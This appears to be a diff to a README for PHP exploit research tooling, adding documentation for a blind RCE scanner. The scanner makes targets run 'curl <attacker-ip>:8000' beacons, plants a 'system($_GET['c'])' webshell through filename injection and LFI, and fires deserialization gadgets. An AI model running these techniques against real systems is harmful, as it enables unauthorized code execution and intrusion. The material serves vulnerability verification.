@@ -231,6 +231,53 @@ Notes:
   against previous runs under a per-run timestamp header. The file stays
   `--hosts`-compatible, so it doubles as a re-scan list.
 
+## Blind scanner (`scan_blind.py`)
+
+Proves RCE even when the target returns **no output**: the payload makes the
+target run `curl <attacker-ip>:8000` against a listener the script opens
+(`0.0.0.0:8000`), and any inbound connection is positive proof. Every
+attempt carries a unique beacon path (`curl <ip>:8000/<tag>`), so a beacon
+identifies *exactly which technique* fired; one literal bare
+`curl <ip>:8000` attempt per chain is peer-IP-attributed. The listener
+replies `BEACON-OK`, so when the execution channel *does* return output the
+beacon is double-confirmed in the response body.
+
+```bash
+uv run scan_blind.py --hosts hosts.txt
+uv run scan_blind.py http://127.0.0.1:18081 --docker p2s2-lab
+uv run scan_blind.py 10.0.0.5:80 --ip 10.0.0.1 --listen-port 8000
+```
+
+Techniques tried per target (the full matrix):
+
+| # | Chain | Technique | Evidence |
+|---|---|---|---|
+| A1 | A | webshell via filename injection (`system($_GET['c'])`) + LFI include; write and LFI endpoints auto-probed unless given | marker, then blind beacons |
+| A2 | A | one-shot payloads: 6 exec wrappers (`system`, `passthru`, `shell_exec`, `exec`, `popen`, backticks) x 2 vectors (filename, progress value), each with its own beacon — runs when `--a-lfi-path` is known but the webshell marker is absent | blind beacons |
+| C1 | C | serialized destruct gadget, marker via `==PROOF==` echo / `--docker` | marker |
+| C2/C3 | C | gadget cmd = `curl <ip>:8000` (bare + tagged) | blind beacons |
+
+Verification ladder: verifiable marker -> blind beacon -> preconditions
+(fixation / handler mismatch) -> `PATCHED?` (fresh Set-Cookie oracle).
+
+Networking notes:
+- the beacon must reach the listener: on the same LAN use your host IP
+  (`--ip` to pin it); otherwise the source IP is auto-detected per target
+  from the routing table.
+- scanning the bundled lab (or any docker target on this host): the target
+  container's loopback is *its own* — the scanner auto-detects the
+  `docker0` bridge IP (`172.17.0.1`) and beacons arrive from the container
+  IP (`172.17.0.x`), which it also uses for bare-beacon attribution.
+- bare-beacon attribution for non-docker loopback targets can catch
+  unrelated local connections hitting the listener port — prefer unique
+  tag evidence there (the scanner warns in the results).
+- the target needs `curl` or `wget` for beacons.
+- the beacon files (`vulnerable.txt` log, `--json`) work exactly as in
+  `scan_hosts.py`.
+
+For authorized testing only — scanning makes the target execute connect-back
+commands.
+
 ## Findings from this verification (beyond the original research)
 
 1. **Filename truncation.** PHP's multipart parser stops a `filename="..."`
@@ -264,7 +311,9 @@ poc_chain_a.py            Chain A PoC  (uv run, stdlib only, http/https)
 poc_chain_c.py            Chain C PoC  (uv run, stdlib only, http/https)
 rce_shell.py              Interactive pseudo-shell over chain A or C (REPL)
 scan_hosts.py             Multi-host scanner for chains A and C (threaded)
-hosts.example.txt         Example target list for the scanner
+scan_blind.py             Blind-capable scanner: beacon listener on :8000,
+                          all techniques (6 exec wrappers x 2 vectors)
+hosts.example.txt         Example target list for the scanners
 poc_chain_b.sh            Chain B driver (behavioral + ASAN stages)
 chainb/poc_uaf.php        Chain B trigger (standalone PHP)
 chainb/Dockerfile.asan    PHP 8.2.34 built from source with AddressSanitizer
